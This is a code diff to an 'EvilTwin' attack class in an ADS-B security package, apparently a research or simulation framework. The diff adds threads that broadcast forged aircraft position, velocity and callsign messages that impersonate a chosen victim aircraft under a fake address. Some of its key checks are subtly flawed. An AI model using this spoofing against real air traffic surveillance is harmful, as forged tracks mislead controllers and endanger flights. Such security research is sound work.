@@ -29,6 +29,7 @@ initial release (Linux/Python)
 import logging
 import random
 import threading
+import time
 import atn.surveillance.adsb.security.glb_defs as ldefs
 
 from .abstract_attack import AbstractAttack
@@ -66,12 +67,83 @@ class EvilTwin(AbstractAttack):
         # dicionário com as infromações da aeronave vítima
         self.__dct_aircraft = {}
 
+        # timeout de espera de mensagens ADS-B da vítima selecionada em segundos
+        self.__time_out = 20
+
         # tempo para iniciar o ataque
         M_LOG.info("<< EvilTwin.__init__")
 
 
     # ---------------------------------------------------------------------------------------------
-    def spy(self, fo_adsbOut=None, fdct_aircraft_table=None, flst_icao24_fake=None):
+    def __airborne_pos_threaded(self):
+        """
+
+        :return:
+        """
+        time.sleep(random.randint(0, 5))
+
+        while True:
+
+            if (ldefs.LATITUDE and ldefs.LONGITUDE and ldefs.LAST_TYPE and ldefs.ALTITUDE) in self.__dct_aircraft:
+                li_sv = 0
+                lf_latitude = self.__dct_aircraft[ldefs.LATITUDE]
+                lf_longitude = self.__dct_aircraft[ldefs.LONGITUDE]
+                lf_altitude = self.__dct_aircraft[ldefs.ALTITUDE]
+                ls_last_position_msg = self.__dct_aircraft[ldefs.LAST_TYPE]
+
+                # Hex
+                ls_msg = self.encode_airborne_position(self.__s_fake_icao24, li_sv, lf_latitude,
+                                                       lf_longitude, lf_altitude, ls_last_position_msg)
+                self.replay(ls_msg)
+
+                # mensagens de meio em meio segundo.
+                time.sleep(0.5)
+
+
+    # ---------------------------------------------------------------------------------------------
+    def __airborne_vel_threaded(self):
+        """
+
+        :return:
+        """
+        time.sleep(random.randint(0,5))
+
+        while True:
+            if  (ldefs.HEADING and ldefs.VERTICAL_RATE and ldefs.GROUND_SPEED) in self.__dct_aircraft:
+                lf_heading = self.__dct_aircraft[ldefs.HEADING]
+                lf_vertical_rate = self.__dct_aircraft[ldefs.VERTICAL_RATE]
+                lf_ground_speed = self.__dct_aircraft[ldefs.GROUND_SPEED]
+
+                # Hex
+                ls_msg = self.encode_airbone_velocity(self.__s_fake_icao24, lf_heading, lf_vertical_rate, lf_ground_speed)
+                self.replay(ls_msg)
+
+                # mensagens de meio em meio segundo.
+                time.sleep(0.5)
+
+
+    # ---------------------------------------------------------------------------------------------
+    def __aircraft_id_threaded(self):
+        """
+
+        :return:
+        """
+        time.sleep(random.randint(0,5))
+
+        while True:
+            if ldefs.CALLSIGN in self.__dct_aircraft:
+                ls_callsing = self.__dct_aircraft[ldefs.CALLSIGN]
+
+                # Hex
+                ls_msg = self.encode_aircraft_identification(ls_callsing, self.__s_fake_icao24)
+                self.replay(ls_msg)
+
+                # mensagens de 5 em 5 segundos
+                time.sleep(5.0)
+
+
+    # ---------------------------------------------------------------------------------------------
+    def spy(self, fdct_aircraft_table=None, flst_icao24_fake=None):
         """
         Escuta da mensagens ADS-B.
 
@@ -89,7 +161,7 @@ class EvilTwin(AbstractAttack):
         # Auto selecting vitim
         if self.__s_spoof_icao24 is None:
             llst_icao24 = fdct_aircraft_table.keys()
-            M_LOG.debug("Lista de endereco ICAO24 simulados %s" % llst_icao24)
+            M_LOG.debug("!! Lista de endereco ICAO24 simulados %s" % llst_icao24)
 
             if len(llst_icao24) > 0:
                 self.__s_spoof_icao24 = random.choice(llst_icao24)
@@ -98,8 +170,24 @@ class EvilTwin(AbstractAttack):
 
         else:
             self.__dct_aircraft = fdct_aircraft_table[self.__s_spoof_icao24]
-            logging.info("> Victim:  %s (%s)" % (self.__dct_aircraft[ldefs.CALLSIGN], self.__s_spoof_icao24))
-            logging.info("> Spoofer: %s (%s)" % (self.__dct_aircraft[ldefs.CALLSIGN], self.__s_fake_icao24))
+
+            logging.info("!! Victim:  %s (%s)" % (self.__dct_aircraft[ldefs.CALLSIGN], self.__s_spoof_icao24))
+            logging.info("!! Spoofer: %s (%s)" % (self.__dct_aircraft[ldefs.CALLSIGN], self.__s_fake_icao24))
+
+            # if not received a message in 20 seconds, looking for another one
+            if (ldefs.LAST_UPDATE in self.__dct_aircraft):
+                if (time.time() - self.__dct_aircraft[ldefs.LAST_UPDATE]) > self.__time_out:
+                    logging.info("!! Aircraft lost")
+                    if self.__s_fake_icao24 in flst_icao24_fake:
+                        flst_icao24_fake.remove(self.__s_fake_icao24)
+                    self.__s_spoof_icao24 = None
+                    self.__s_fake_icao24 = None
+                    self.__dct_aircraft = {}
+                    # waiting for new attack
+                    self.restart()
+
+            if ldefs.LATITUDE in self.__dct_aircraft:
+                self.__dct_aircraft[ldefs.LATITUDE] += 0.05;
 
         M_LOG.info("<< EvilTwin.spy")
         return
@@ -124,14 +212,14 @@ class EvilTwin(AbstractAttack):
         super(EvilTwin, self).start(fi_time_to_attack, fi_interval_to_attack)
 
         # iniciar as threads aqui!!!!
-        #t1 = threading.Thread(target=self.airborne_position_threaded, args=())
-        #t2 = threading.Thread(target=self.airborne_velocity_threaded, args=())
-        #t3 = threading.Thread(target=self.aircraft_id_threaded, args=())
+        t1 = threading.Thread(target=self.__airborne_pos_threaded, args=())
+        t2 = threading.Thread(target=self.__airborne_vel_threaded, args=())
+        t3 = threading.Thread(target=self.__aircraft_id_threaded, args=())
 
         # Start broadcasting
-        #t1.start()  # Airborne position
-        #t2.start()  # Airborne velocity
-        #t3.start()  # Aircraft identification
+        t1.start()  # Airborne position
+        t2.start()  # Airborne velocity
+        t3.start()  # Aircraft identification
 
         return
 
